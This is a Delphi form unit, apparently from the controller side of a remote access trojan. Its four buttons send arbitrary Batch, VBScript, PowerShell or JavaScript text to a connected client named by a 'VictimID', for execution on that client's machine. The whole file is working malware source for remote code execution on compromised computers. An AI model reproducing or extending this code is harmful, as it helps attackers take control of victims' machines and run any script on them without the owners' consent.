unit FrmRemoteScripting;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls;

type
  TForm15 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    Memo1: TMemo;
    Button1: TButton;
    TabSheet3: TTabSheet;
    Memo2: TMemo;
    Button2: TButton;
    TabSheet2: TTabSheet;
    Memo3: TMemo;
    Button3: TButton;
    JavaScript: TTabSheet;
    Memo4: TMemo;
    Button4: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form15: TForm15;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm15.Button1Click(Sender: TObject);
var
  Script: string;
begin
  Script := Memo1.Text;
  SendToSelectedClient(ThisFormsVictimID, 'BatchScript|' + Script);
end;

procedure TForm15.Button2Click(Sender: TObject);
var
  Script: string;
begin
  Script := Memo2.Text;
  SendToSelectedClient(ThisFormsVictimID, 'VBScript|' + Script);
end;

procedure TForm15.Button3Click(Sender: TObject);
var
  Script: string;
begin
  Script := Memo3.Text;
  SendToSelectedClient(ThisFormsVictimID, 'PowershellScript|' + Script);
end;

procedure TForm15.Button4Click(Sender: TObject);
var
  Script: string;
begin
  Script := Memo4.Text;
  SendToSelectedClient(ThisFormsVictimID, 'Javascript|' + Script);
end;

end.
